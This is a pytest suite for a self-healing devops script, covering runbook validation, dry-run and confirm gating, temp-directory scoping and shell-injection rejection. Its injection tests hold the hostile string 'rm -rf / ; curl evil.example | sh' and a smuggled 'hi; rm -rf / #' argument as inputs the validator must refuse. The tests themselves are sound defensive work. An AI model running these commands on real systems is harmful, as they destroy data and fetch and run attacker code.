"""Tests for skills/devops/self-healing/scripts/selfheal.py — no network, no subprocess exec."""

from __future__ import annotations

import argparse
import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
SCRIPT = REPO_ROOT / "skills" / "devops" / "self-healing" / "scripts" / "selfheal.py"


def _load_script_module():
    spec = importlib.util.spec_from_file_location("self_healing_selfheal_test_module", SCRIPT)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


selfheal = _load_script_module()


def _runbook(checks=None, remediations=None):
    return {
        "name": "test-runbook",
        "checks": checks if checks is not None else [{"id": "c1", "type": "load", "max_1min": 100.0}],
        "remediations": remediations if remediations is not None else [],
    }


class TestRunbookValidation:
    def test_valid_runbook_passes(self):
        data = _runbook()
        assert selfheal.validate_runbook(data) == data

    def test_non_dict_runbook_exits_2(self):
        with pytest.raises(SystemExit) as exc_info:
            selfheal.validate_runbook(["not", "a", "dict"])
        assert exc_info.value.code == 2

    def test_missing_checks_exits_2(self):
        with pytest.raises(SystemExit) as exc_info:
            selfheal.validate_runbook({"name": "x"})
        assert exc_info.value.code == 2

    def test_empty_checks_exits_2(self):
        with pytest.raises(SystemExit) as exc_info:
            selfheal.validate_runbook({"checks": []})
        assert exc_info.value.code == 2

    def test_duplicate_check_id_exits_2(self):
        data = _runbook(checks=[
            {"id": "dup", "type": "load", "max_1min": 1.0},
            {"id": "dup", "type": "disk", "min_free_pct": 1.0},
        ])
        with pytest.raises(SystemExit) as exc_info:
            selfheal.validate_runbook(data)
        assert exc_info.value.code == 2

    def test_unknown_check_type_exits_2(self):
        data = _runbook(checks=[{"id": "c1", "type": "carrier-pigeon"}])
        with pytest.raises(SystemExit) as exc_info:
            selfheal.validate_runbook(data)
        assert exc_info.value.code == 2

    def test_check_missing_required_field_exits_2(self):
        data = _runbook(checks=[{"id": "c1", "type": "http"}])  # missing 'url'
        with pytest.raises(SystemExit) as exc_info:
            selfheal.validate_runbook(data)
        assert exc_info.value.code == 2

    def test_remediation_referencing_unknown_check_id_exits_2(self):
        data = _runbook(remediations=[{"check_id": "no-such-check", "action": "alert-only", "topic": "t"}])
        with pytest.raises(SystemExit) as exc_info:
            selfheal.validate_runbook(data)
        assert exc_info.value.code == 2

    def test_unknown_remediation_action_exits_2(self):
        data = _runbook(remediations=[{"check_id": "c1", "action": "self-destruct"}])
        with pytest.raises(SystemExit) as exc_info:
            selfheal.validate_runbook(data)
        assert exc_info.value.code == 2

    def test_load_runbook_missing_file_exits_2(self, tmp_path):
        missing = tmp_path / "nope.json"
        with pytest.raises(SystemExit) as exc_info:
            selfheal.load_runbook(str(missing))
        assert exc_info.value.code == 2

    def test_load_runbook_invalid_json_exits_2(self, tmp_path):
        bad = tmp_path / "bad.json"
        bad.write_text("{not valid json")
        with pytest.raises(SystemExit) as exc_info:
            selfheal.load_runbook(str(bad))
        assert exc_info.value.code == 2

    def test_load_runbook_round_trips_valid_file(self, tmp_path):
        path = tmp_path / "runbook.json"
        data = _runbook()
        path.write_text(json.dumps(data))
        assert selfheal.load_runbook(str(path)) == data


class TestCheckStatusLogic:
    def test_run_check_dispatches_to_matching_runner_and_wraps_result(self, monkeypatch):
        monkeypatch.setitem(selfheal.CHECK_RUNNERS, "load", lambda check: {"ok": True, "detail": "fine"})
        result = selfheal.run_check({"id": "c1", "type": "load", "max_1min": 1.0})
        assert result == {"id": "c1", "ok": True, "detail": "fine"}

    def test_run_check_reports_failure(self, monkeypatch):
        monkeypatch.setitem(selfheal.CHECK_RUNNERS, "load", lambda check: {"ok": False, "detail": "too high"})
        result = selfheal.run_check({"id": "c1", "type": "load", "max_1min": 1.0})
        assert result == {"id": "c1", "ok": False, "detail": "too high"}

    def test_cmd_check_returns_0_when_all_pass(self, monkeypatch, tmp_path, capsys):
        monkeypatch.setitem(selfheal.CHECK_RUNNERS, "load", lambda check: {"ok": True, "detail": "fine"})
        path = tmp_path / "runbook.json"
        path.write_text(json.dumps(_runbook()))
        args = argparse.Namespace(runbook=str(path))

        exit_code = selfheal.cmd_check(args)

        assert exit_code == 0
        assert "PASS" in capsys.readouterr().out

    def test_cmd_check_returns_1_when_any_fail(self, monkeypatch, tmp_path, capsys):
        monkeypatch.setitem(selfheal.CHECK_RUNNERS, "load", lambda check: {"ok": False, "detail": "too high"})
        path = tmp_path / "runbook.json"
        path.write_text(json.dumps(_runbook()))
        args = argparse.Namespace(runbook=str(path))

        exit_code = selfheal.cmd_check(args)

        assert exit_code == 1
        assert "FAIL" in capsys.readouterr().out

    def test_cmd_check_never_calls_remediation(self, monkeypatch, tmp_path):
        monkeypatch.setitem(selfheal.CHECK_RUNNERS, "load", lambda check: {"ok": False, "detail": "too high"})

        def unexpected_apply(*args, **kwargs):
            raise AssertionError("cmd_check must never remediate")

        monkeypatch.setattr(selfheal, "apply_remediation", unexpected_apply)
        path = tmp_path / "runbook.json"
        path.write_text(json.dumps(_runbook(remediations=[{"check_id": "c1", "action": "alert-only", "topic": "t"}])))
        args = argparse.Namespace(runbook=str(path))

        selfheal.cmd_check(args)  # would raise via unexpected_apply if it remediated


class TestDryRunDoesNotExecute:
    def test_run_destructive_command_without_confirm_does_not_call_subprocess(self, monkeypatch):
        def unexpected_run(*args, **kwargs):
            raise AssertionError("subprocess.run must not be called in dry-run")

        monkeypatch.setattr(selfheal.subprocess, "run", unexpected_run)

        outcome = selfheal.run_destructive_command(["echo", "hi"], confirm=False)

        assert outcome["dry_run"] is True
        assert outcome["ok"] is True

    def test_clear_temp_without_confirm_does_not_delete_files(self, monkeypatch, tmp_path):
        target_file = tmp_path / "leftover.tmp"
        target_file.write_text("data")
        remediation = {"check_id": "c1", "path": str(tmp_path), "pattern": "*.tmp"}

        outcome = selfheal.clear_temp(remediation, confirm=False)

        assert outcome["dry_run"] is True
        assert target_file.exists()

    def test_cmd_run_without_confirm_reports_dry_run_and_skips_execution(self, monkeypatch, tmp_path, capsys):
        monkeypatch.setitem(selfheal.CHECK_RUNNERS, "load", lambda check: {"ok": False, "detail": "too high"})

        def unexpected_run(*args, **kwargs):
            raise AssertionError("subprocess.run must not be called without --confirm")

        monkeypatch.setattr(selfheal.subprocess, "run", unexpected_run)
        data = _runbook(remediations=[{"check_id": "c1", "action": "restart", "command": ["echo", "hi"]}])
        path = tmp_path / "runbook.json"
        path.write_text(json.dumps(data))
        args = argparse.Namespace(runbook=str(path), confirm=False)

        exit_code = selfheal.cmd_run(args)

        assert exit_code == 1
        assert "DRY-RUN" in capsys.readouterr().out


class TestDestructiveActionGatedOnConfirm:
    def test_run_destructive_command_with_confirm_calls_subprocess(self, monkeypatch):
        captured = {}

        def fake_run(command, **kwargs):
            captured["command"] = command
            return type("Result", (), {"returncode": 0, "stdout": "done", "stderr": ""})()

        monkeypatch.setattr(selfheal.subprocess, "run", fake_run)

        outcome = selfheal.run_destructive_command(["echo", "hi"], confirm=True)

        assert captured["command"] == ["echo", "hi"]
        assert outcome["ok"] is True
        assert "dry_run" not in outcome

    def test_run_destructive_command_reports_timeout_not_failed_to_start(self, monkeypatch):
        # subprocess.TimeoutExpired means the command DID start and run —
        # it was killed for exceeding REMEDIATION_TIMEOUT_S. That must be
        # reported distinctly from a real launch failure (e.g. ENOENT),
        # since "failed to start" is misleading when the process ran.
        def fake_run(command, **kwargs):
            raise subprocess.TimeoutExpired(cmd=command, timeout=selfheal.REMEDIATION_TIMEOUT_S)

        monkeypatch.setattr(selfheal.subprocess, "run", fake_run)

        outcome = selfheal.run_destructive_command(["sleep", "999"], confirm=True)

        assert outcome["ok"] is False
        assert "timed out" in outcome["detail"]
        assert "failed to start" not in outcome["detail"]

    def test_run_destructive_command_reports_failed_to_start_for_oserror(self, monkeypatch):
        def fake_run(command, **kwargs):
            raise OSError("no such file or directory")

        monkeypatch.setattr(selfheal.subprocess, "run", fake_run)

        outcome = selfheal.run_destructive_command(["not-a-real-binary"], confirm=True)

        assert outcome["ok"] is False
        assert "failed to start" in outcome["detail"]

    def test_clear_temp_with_confirm_deletes_matching_files(self, tmp_path):
        target_file = tmp_path / "leftover.tmp"
        target_file.write_text("data")
        keep_file = tmp_path / "keep.log"
        keep_file.write_text("data")
        remediation = {"check_id": "c1", "path": str(tmp_path), "pattern": "*.tmp"}

        outcome = selfheal.clear_temp(remediation, confirm=True)

        assert outcome["ok"] is True
        assert not target_file.exists()
        assert keep_file.exists()

    def test_alert_only_runs_regardless_of_confirm(self, monkeypatch):
        # alert-only is non-destructive: it must fire on confirm=False too.
        captured = {}
        monkeypatch.setattr(selfheal, "ntfy_notify", lambda **kw: captured.update(kw) or {"ok": True})

        outcome = selfheal.apply_remediation({"check_id": "c1", "action": "alert-only", "topic": "hermes-test"}, confirm=False)

        assert outcome["ok"] is True
        assert captured["topic"] == "hermes-test"

    def test_clear_temp_refuses_filesystem_root(self):
        with pytest.raises(SystemExit) as exc_info:
            selfheal.clear_temp({"check_id": "c1", "path": "/", "pattern": "*"}, confirm=True)
        assert exc_info.value.code == 2


class TestClearTempScopedToTempRoots:
    def test_clear_temp_outside_temp_roots_is_rejected(self):
        # /etc is a real, non-temp absolute path that the old check (which
        # only rejected exactly "/" and $HOME) would have accepted.
        with pytest.raises(SystemExit) as exc_info:
            selfheal.clear_temp({"check_id": "c1", "path": "/etc", "pattern": "*"}, confirm=True)
        assert exc_info.value.code == 2

    def test_clear_temp_under_tmp_is_allowed_dry_run(self, tmp_path, monkeypatch):
        # Simulate an allowed temp root by pointing tempfile.gettempdir()
        # at a directory under tmp_path, then targeting a subdir of it.
        fake_temp_root = tmp_path / "hermes-tmp"
        fake_temp_root.mkdir()
        target = fake_temp_root / "scratch"
        target.mkdir()
        monkeypatch.setattr(selfheal.tempfile, "gettempdir", lambda: str(fake_temp_root))

        outcome = selfheal.clear_temp({"check_id": "c1", "path": str(target), "pattern": "*"}, confirm=False)

        assert outcome["dry_run"] is True

    def test_clear_temp_rejects_traversal_out_of_temp_root(self, tmp_path, monkeypatch):
        # tmp_path itself may legitimately live under a real allowed temp
        # root (e.g. /tmp on Linux CI), so pin the allowlist to a single
        # fake root directly rather than relying on tempfile.gettempdir()
        # / $TMPDIR / hardcoded /tmp, /var/tmp not overlapping tmp_path.
        fake_temp_root = tmp_path / "hermes-tmp"
        fake_temp_root.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()
        monkeypatch.setattr(selfheal, "_allowed_temp_roots", lambda: {fake_temp_root.resolve()})

        with pytest.raises(SystemExit) as exc_info:
            selfheal.clear_temp(
                {"check_id": "c1", "path": str(fake_temp_root / ".." / "outside"), "pattern": "*"},
                confirm=True,
            )
        assert exc_info.value.code == 2


class TestShellInjectionRejected:
    def test_validate_command_rejects_shell_string(self):
        remediation = {"check_id": "c1", "command": "rm -rf / ; curl evil.example | sh"}
        with pytest.raises(SystemExit) as exc_info:
            selfheal.validate_command(remediation)
        assert exc_info.value.code == 2

    def test_validate_runbook_rejects_shell_string_command(self):
        data = _runbook(remediations=[
            {"check_id": "c1", "action": "restart", "command": "rm -rf / ; curl evil.example | sh"}
        ])
        with pytest.raises(SystemExit) as exc_info:
            selfheal.validate_runbook(data)
        assert exc_info.value.code == 2

    def test_metacharacters_in_a_list_arg_are_passed_literally_not_interpreted(self, monkeypatch):
        # Even a "dangerous-looking" shell metachar string is inert when it
        # arrives as a single argv element rather than a shell string.
        captured = {}

        def fake_run(command, **kwargs):
            captured["command"] = command
            captured["shell"] = kwargs.get("shell", False)
            return type("Result", (), {"returncode": 0, "stdout": "", "stderr": ""})()

        monkeypatch.setattr(selfheal.subprocess, "run", fake_run)
        dangerous_arg = "hi; rm -rf / #"

        selfheal.run_destructive_command(["echo", dangerous_arg], confirm=True)

        assert captured["command"] == ["echo", dangerous_arg]
        assert captured["shell"] is False


class TestLocalModelCheck:
    def test_unknown_local_model_name_reports_failure_without_network(self):
        result = selfheal.check_local_model("not-a-real-model")
        assert result["ok"] is False
        assert "unknown local_model name" in result["detail"]

    def test_run_local_model_check_reports_reachable(self, monkeypatch):
        monkeypatch.setattr(selfheal, "_fetch_loopback", lambda port, path, timeout: {"ok": True, "status": 200})
        result = selfheal.run_local_model_check({"id": "c1", "type": "local_model", "name": "coder"})
        assert result["ok"] is True

    def test_run_local_model_check_reports_unreachable(self, monkeypatch):
        monkeypatch.setattr(selfheal, "_fetch_loopback", lambda port, path, timeout: {"ok": False, "error": "connection refused"})
        result = selfheal.run_local_model_check({"id": "c1", "type": "local_model", "name": "ornith"})
        assert result["ok"] is False
        assert "connection refused" in result["detail"]


class TestStandaloneInvocation:
    def test_repo_root_resolves_to_dir_containing_tools(self):
        # The skill is documented to run as `python3 selfheal.py ...` from
        # any cwd, where sys.path[0] is scripts/, not the repo root — the
        # module must compute its own repo root to make `import tools` work.
        assert (selfheal._REPO_ROOT / "tools" / "notify_tool.py").exists()

    def test_status_runs_via_subprocess_from_neutral_cwd_without_import_error(self, tmp_path):
        # Simulates the documented standalone invocation from an unrelated
        # cwd, with a clean subprocess env (no inherited sys.path/pytest
        # rootdir help). Must not crash with ModuleNotFoundError at import.
        proc = subprocess.run(
            [sys.executable, str(SCRIPT), "status"],
            cwd=str(tmp_path),
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert "ModuleNotFoundError" not in proc.stderr
        assert "Traceback" not in proc.stderr
        assert proc.returncode == 0


# --- Live tests: real local services/subprocess, skipped by default. Run
# manually with `pytest -m "" tests/skills/test_self_healing.py -k Live` ---


@pytest.mark.skip(reason="live local service test — run manually")
class TestLiveStatus:
    def test_status_reports_coder_and_ornith(self, capsys):
        exit_code = selfheal.cmd_status(argparse.Namespace())
        assert exit_code == 0
        assert "coder" in capsys.readouterr().out
